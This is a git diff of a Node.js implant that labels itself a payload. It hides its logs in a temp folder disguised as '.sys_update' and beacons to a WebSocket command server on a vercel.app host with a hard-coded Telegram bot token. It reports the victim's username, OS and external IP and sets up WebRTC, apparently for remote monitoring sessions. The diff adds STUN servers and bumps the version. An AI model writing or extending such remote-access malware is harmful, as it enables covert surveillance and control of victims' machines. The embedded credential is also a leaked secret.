@@ -7,6 +7,10 @@ const https = require('https');
 const crypto = require('crypto');
 const http = require('http'); 
 
+// Import WebRTC API for Node.js
+const { RTCPeerConnection, RTCSessionDescription, RTCIceCandidate } = require('w3c-web-rtc');
+
+// --- LOGGING SYSTEM ---
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
 const LOG_FILE = path.join(LOG_DIR, 'payload.log');
 if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
@@ -21,6 +25,7 @@ function log(msg) {
 
 log("[INIT] Payload Active starting...");
 
+// --- CONFIGURATION ---
 const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
 
 const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
@@ -34,7 +39,13 @@ let isConnected = false;
 let isSessionActive = false;
 
 // WebRTC Setup
-const peerConnection = new RTCPeerConnection();
+const peerConnection = new RTCPeerConnection({
+ iceServers: [
+   { urls: 'stun:stun.l.google.com:19302' },
+   { urls: 'stun:global.stun.twilio.com:3478' }
+ ]
+});
+
 peerConnection.onicecandidate = event => {
  if (event.candidate) {
   safeSend(JSON.stringify({
@@ -84,7 +95,7 @@ function initConnection() {
    arch: os.arch(),
    user: os.userInfo().username,
    ip: getExternalIP(),
-   version: '2.0.2'
+   version: '2.0.3'
   }));
 
   startMonitoring();
@@ -260,6 +271,7 @@ function keepAlive() {
  setInterval(() => {}, 60000);
 }
 
+// --- HTTP SERVER SETUP ---
 const PORT = process.env.PORT || 3000;
 
 const server = http.createServer((req, res) => {
